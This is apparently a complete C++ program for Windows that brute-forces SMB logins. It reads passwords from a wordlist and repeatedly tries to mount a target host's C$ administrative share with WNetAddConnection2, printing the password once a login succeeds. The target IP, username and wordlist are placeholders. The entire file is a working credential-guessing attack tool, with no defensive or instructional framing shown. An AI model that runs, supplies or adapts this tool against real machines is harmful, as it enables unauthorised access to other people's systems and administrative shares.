#include <Windows.h>
#include <iostream>
#include <winnetwk.h>
#include <fstream>
#include <string>
#include <stdlib.h>

#pragma comment(lib, "Mpr.lib")

using namespace std;

// Function to attempt SMB authentication
DWORD SmbAuth(const char* username, const char* wordlistPath, const char* hostname) {
    NETRESOURCE nr;
    memset(&nr, 0, sizeof(NETRESOURCE));
    nr.dwType = RESOURCETYPE_DISK;

    // Access the default administrative share
    string remotePath = string("\\\\") + hostname + "\\C$"; // Use C$ for administrative share access
    wstring wRemotePath(remotePath.begin(), remotePath.end());

    nr.lpLocalName = NULL; // No local drive letter needed
    nr.lpRemoteName = const_cast<LPWSTR>(wRemotePath.c_str());
    nr.lpProvider = NULL;

    // Convert the username into a wide string
    wstring wUser(username, username + strlen(username));

    // Open the wordlist file
    ifstream wordlist(wordlistPath);
    if (!wordlist.is_open()) {
        cerr << "[!] Failed to open wordlist!" << endl;
        cerr << "[!] Error: " << GetLastError() << endl;
        return ERROR_FILE_NOT_FOUND;
    }

    string password;
    // Loop through each password in the wordlist
    while (getline(wordlist, password)) {
        wstring wPassword(password.begin(), password.end());

        // Attempt to connect using WNetAddConnection2
        DWORD result = WNetAddConnection2(&nr, wPassword.c_str(), wUser.c_str(), 0);

        if (result == NO_ERROR) {
            wcout << L"[+] Authentication Successful!" << endl;
            wcout << L"[+] Password: " << wPassword.c_str() << endl;
            wordlist.close();
            exit(0);
            return NO_ERROR;
        }
        else {
            // Detailed error handling
            cerr << "[-] Connection failed with error: " << result << " for password: " << password << endl;
            switch (result) {
            case ERROR_LOGON_FAILURE:
                cerr << "[-] ERROR_LOGON_FAILURE: The username or password is incorrect." << endl;
                break;
            case ERROR_NO_LOGON_SERVERS:
                cerr << "[-] ERROR_NO_LOGON_SERVERS: Cannot contact a logon server." << endl;
                break;
            case ERROR_NOT_AUTHENTICATED:
                cerr << "[-] ERROR_NOT_AUTHENTICATED: The user is not authenticated." << endl;
                break;
            case ERROR_ACCESS_DENIED:
                cerr << "[-] ERROR_ACCESS_DENIED: Access was denied." << endl;
                break;
                // You can add more cases for specific error codes if needed
            default:
                cerr << "[-] General error: " << result << endl;
                break;
            }
        }
    }

    wordlist.close();
    return ERROR_ACCESS_DENIED; // Return access denied if all passwords failed
}

int main() {
    // Use the correct username format: DOMAIN\username or HOSTNAME\username
    const char username[] = "<write your username>"; // Ensure this is the correct format
    const char wordlistPath[] = "<write your password list>"; // Path to the password wordlist
    const char hostname[] = "<write your ip>"; // The target hostname or IP address

    DWORD result = SmbAuth(username, wordlistPath, hostname);

    if (result == NO_ERROR) {
        cout << "Authentication was successful." << endl;
    }
    else {
        cout << "Authentication failed with error code: " << result << endl;
    }

    return 0;
}
